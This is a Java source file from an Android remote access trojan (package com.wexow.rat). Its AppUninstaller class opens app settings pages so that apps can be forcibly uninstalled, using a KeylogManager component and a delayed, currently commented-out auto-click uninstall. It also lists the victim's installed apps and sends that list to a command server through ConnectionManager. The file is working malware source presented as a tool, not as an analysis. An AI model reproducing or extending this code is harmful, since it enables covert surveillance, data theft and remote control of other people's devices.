package com.wexow.rat.managers;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.provider.Settings;
import android.util.Log;

import com.wexow.rat.KeylogManager;

public class AppUninstaller {
    private static final String TAG = "AppUninstaller";

    public static void uninstallViaIntent(Context ctx, String packageName) {
    Log.e(TAG, "🗑️ uninstallViaIntent: " + packageName);
    
    try {
        Intent i = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        i.setData(Uri.parse("package:" + packageName));
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        
        Log.e(TAG, "🚀 Opening App Settings");
        
        if (KeylogManager.getInstance() != null) {
            KeylogManager.getInstance().startActivity(i);
            
            new android.os.Handler(android.os.Looper.getMainLooper())
                .postDelayed(() -> {
                    if (KeylogManager.getInstance() != null) {
                        Log.e(TAG, "🎯 Starting autoClickUninstall");
                        //KeylogManager.getInstance().autoClickUninstall();
                    }
                }, 4000);
        } else {
            ctx.startActivity(i);
        }
    } catch (Exception e) {
        Log.e(TAG, "❌ " + e.getMessage());
    }
}

    public static void uninstallViaPackageInstaller(Context ctx, String packageName) {
        uninstallViaIntent(ctx, packageName);
    }

    public static void uninstallMultiple(Context ctx, String[] packages) {
        new Thread(() -> {
            for (String pkg : packages) {
                uninstallViaIntent(ctx, pkg);
                try { Thread.sleep(5000); } catch (Exception ignored) {}
            }
        }).start();
    }

    public static void listUninstallable(Context ctx) {
        new Thread(() -> {
            try {
                android.content.pm.PackageManager pm = ctx.getPackageManager();
                java.util.List<android.content.pm.ApplicationInfo> apps = 
                    pm.getInstalledApplications(0);

                org.json.JSONArray arr = new org.json.JSONArray();
                for (android.content.pm.ApplicationInfo app : apps) {
                    if ((app.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0
                        && (app.flags & android.content.pm.ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) == 0) continue;
                    if (app.packageName.equals(ctx.getPackageName())) continue;

                    org.json.JSONObject jo = new org.json.JSONObject();
                    jo.put("package", app.packageName);
                    jo.put("name", pm.getApplicationLabel(app).toString());
                    arr.put(jo);
                }

                org.json.JSONObject res = new org.json.JSONObject();
                res.put("type", "uninstallable_apps");
                res.put("count", arr.length());
                res.put("data", arr);
                com.wexow.rat.core.ConnectionManager.send(res.toString());
                Log.e(TAG, "📤 Sent " + arr.length() + " apps");
            } catch (Exception e) {
                Log.e(TAG, "❌ listUninstallable: " + e.getMessage());
            }
        }).start();
    }
}
